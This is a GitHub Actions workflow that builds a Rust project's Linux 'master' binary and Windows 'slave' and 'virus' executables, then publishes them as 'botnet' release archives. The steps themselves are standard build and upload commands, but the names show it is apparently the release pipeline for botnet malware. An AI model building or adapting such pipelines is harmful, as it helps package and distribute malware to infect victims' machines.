name: release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: dtolnay/rust-toolchain@stable

      - name: build master (linux)
        run: cargo build --release --bin master

      - name: pack master
        run: |
          zip -j botnet-master-linux-x86_64.zip target/release/master
          mv botnet-master-linux-x86_64.zip ../

      - uses: actions/upload-artifact@v4
        with:
          name: master-linux
          path: ../botnet-master-linux-x86_64.zip

  build-windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - uses: dtolnay/rust-toolchain@stable

      - name: build slave + virus (windows)
        run: cargo build --release

      - name: pack slave and virus
        shell: pwsh
        run: |
          Compress-Archive -Path target/release/slave.exe -DestinationPath botnet-slave-windows-x86_64.zip
          Compress-Archive -Path target/release/virus.exe -Update -DestinationPath botnet-slave-windows-x86_64.zip
          Move-Item botnet-slave-windows-x86_64.zip ..

      - uses: actions/upload-artifact@v4
        with:
          name: slave-windows
          path: ../botnet-slave-windows-x86_64.zip

  release:
    needs: [build-linux, build-windows]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          merge-multiple: true

      - name: create release
        uses: softprops/action-gh-release@v2
        with:
          files: |
            botnet-master-linux-x86_64.zip
            botnet-slave-windows-x86_64.zip
          generate_release_notes: true
